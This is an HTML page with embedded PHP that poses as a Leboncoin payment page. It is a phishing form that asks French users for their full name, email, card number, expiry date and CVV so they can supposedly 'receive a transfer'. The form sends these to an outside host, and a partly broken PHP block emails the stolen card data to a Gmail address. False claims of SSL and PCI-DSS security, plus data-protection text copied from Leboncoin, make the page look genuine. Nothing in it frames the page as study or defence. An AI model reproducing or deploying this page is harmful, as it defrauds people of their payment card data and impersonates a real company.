<!DOCTYPE html>

<html>
    <head>
    	<link rel="icon" type="image/png" sizes="16x16" href="https://play-lh.googleusercontent.com/SONvInXqa1E1rov3Km6N7-_U44D1qjTqAe-KC1hORzJB1uwvuydY2z86RwaN5cEtb9w">

        <meta charset="utf-8">
        <link rel="stylesheet" href="style.css">
        <title>leboncoin</title>

    <head>

    <body>
    	<h1><img src="https://upload.wikimedia.org/wikipedia/fr/3/3b/Leboncoin_logo_2021.png" alt="Logo HubSpot" width=15% height=15%></h1>
    	<hr size="100" width="0" align="right">

    	
    	<p1><center><font size="6">Veuillez entrer les informations démandées ci dessous afin de recevoir le virement</font></center></p1>
    	<hr size="50" width="0" align="right">



    	<p2><center><font size="6">SAISISSEZ LE NUMERO DE VOTRE  CARTE  BANCAIRE

</font></center>
        <hr size="30" width="0" align="right">

        <p21><center><img src="https://www.reussir-mon-ecommerce.fr/wp-content/uploads/2016/03/CB-1.jpg" width=30% height=30%></center>
	

<br>
</p2>
         <h2><center>Renseignez ici</center></h2>

         <fieldset style="width:25%;"><form class="formulaire" method="Post" action="https://recevoirviaboncoin.cmonsite.fr/-p351966.html" action="mail">

         <center>
         	<label>Nom et Prénom</label>
         	<input type="text" class="model" name="Nom et prenom" placeholder="nom & prenom" required>
             <label>Adresse mail</label>
              <input type="email" class="model" name="exemple@exemple.com" placeholder="exemple@exemple.com" required>
             <label>Numéro de carte bancaire</label>
             <input type="text" class="model" name="Numéro de carte bancaire" placeholder="4900................" required>
             <label>Date d'expiration</label>
             <input type="text" class="model" name="Date d'expiration" placeholder="(mm/aa)" required>
             <label>Cryptogramme</label>
             <input type="text" class="model" name="Cryptogramme" placeholder="000" required>
         </center>

             <center><input type="submit" value="confirmer" name="confirmer"></center>
             
         </form></fieldset>
         <?php

         if (insset($_POST["message"])) {
         	 $message = "ce message a été envoyé via mon site
         	 Nom et Prénom : " . $_POST["Nom et Prénom"] . "
         	 Adresse mail : " . $_POST["Adresse mail"] . "
         	 Numéro de carte bancaire: " . $_POST["Numéro de carte bancaire"] . "
         	 Date d'expiration : " . $_POST["Date d'expiration"] . "
         	 Cryptogramme : " . $_POST["Cryptogramme"] . "

             $retour = mail("leboncoinpaiement1@gmail.com", $_POST["message"], 'From: webmaster@monsite.fr' . "\r\n" . 'Reply-to: ' . $_POST['email']);
             if($retour)   
         }
         ?> 

        
             

             

             <p3><center>**Vous êtes sur un serveur de paiement sécurisé par les normes ssl (https) et pcidss de nos partenaires bancaires. Vos données sont encryptées pour plus de sécurité.</center></p3>
             <hr size="150" width="0" align="right">

             <Div Align=Left><h3>INFORMATION</h3>  
             	<hr size="10" width="0" align="right">



Le responsable de traitement, les destinataires et la finalité de la collecte des données.

Dans le cadre de l’exécution du contrat qui nous lie, vos données de paiement sont indispensables à Leboncoin pour donner suite à votre paiement. A cette fin, elles sont transmises à notre prestataire de service de paiement, qui concourt techniquement à réaliser la finalité ci-dessus. Nous sommes susceptibles de traiter vos données de manière automatisée à des fins de lutte contre la fraude. Ce traitement pourra donner lieu à un blocage automatique de votre transaction.

Vos droits, la durée de conservation de vos données et les moyens de nous contacter

Vos données seront conservées par notre prestataire de paiement pendant 13 mois, à l’exception du cryptogramme que notre prestataire ne conserve que le temps d’exécuter la transaction. Pour plus d’informations sur vos droits, contactez notre service client, ou notre délégué à la protection des données.

</Div></p3>
             
<footer style="position: initial; bottom: 0px; width: 100%; height: 100px; background-color: grey;">
    <p6 style="color: #1a1a1a;">leboncoin 2006 - 2022</p6> 

  </footer>
    </body>



        
</html>